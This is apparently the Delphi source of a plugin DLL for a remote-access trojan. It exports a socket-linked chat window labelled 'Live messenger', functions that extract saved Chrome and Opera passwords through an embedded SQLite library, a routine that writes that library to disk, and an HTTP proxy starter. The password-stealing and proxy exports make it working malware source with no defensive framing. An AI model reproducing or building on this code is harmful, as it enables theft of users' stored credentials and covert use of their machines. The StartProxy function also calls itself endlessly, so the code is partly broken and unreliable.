library Plugin;

uses
  Windows,
  Classes,
  Forms,
  SysUtils,
  UnitConstants,
  SocketUnit,
  UnitChat in 'UnitChat.pas' {FormChat},
  UnitChromePasswords in 'UnitChromePasswords.pas',
  IdHTTPProxyServer in 'IdHTTPProxyServer.pas',
  UnitOperaPasswords in 'UnitOperaPasswords.pas';

{$R *.res}
{$R sqlite3.RES}
    
var
  Active: Boolean;

function PluginInfos: PChar; stdcall;
begin
  Result := PROGRAMNAME + ' ' + PROGRAMVERSION + ' by ' + PROGRAMAUTHOR;
end;

//-----

procedure StartChat(ClientSocket: TClientSocket; Nickname: string); stdcall;
var
  Msg: TMsg;
begin
  FormChat := TFormChat.Create(Application);
  FormChat.SetInfos(ClientSocket, Nickname);
  FormChat.Caption := 'Live messenger - ' + TimeToStr(Time);
  FormChat.Show;
  
  Active := True;
  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    if not Active then
    begin
      FormChat.Free;
      Break;
    end;
    DispatchMessage(Msg);
  end;
end;

procedure WriteMessage(TmpMsg: PChar); stdcall;
begin
  FormChat.WriteMessage(TmpMsg);
end;

procedure StopChat; stdcall;
begin
  Active := False;
end;

//-----

function ChromePasswords(Sqlite3Path: PChar): PChar; stdcall;
begin
  Result := PChar(ListChromePasswords(Sqlite3Path));
end;

function OperaPasswords(Sqlite3Path: PChar): PChar; stdcall;
begin
  Result := PChar(ListOperaPasswords(Sqlite3Path));
end;

procedure LoadSqlite3(Sqlite3File: PChar); stdcall;
var
  TmpRes: TResourceStream;
begin
  TmpRes := TResourceStream.Create(HInstance, 'SQLITE3', 'Sqlite3File');
  TmpRes.SaveToFile(Sqlite3File);
  TmpRes.Free;
end;

//-----

function StartProxy(Port: Word; Mutex: PChar): Boolean;
begin
  Result := StartProxy(Port, Mutex);
end;

//-----
     
exports
  PluginInfos,
  StartChat,
  StopChat,
  WriteMessage,
  LoadSqlite3,
  ChromePasswords,
  OperaPasswords,
  StartProxy;

begin
end.
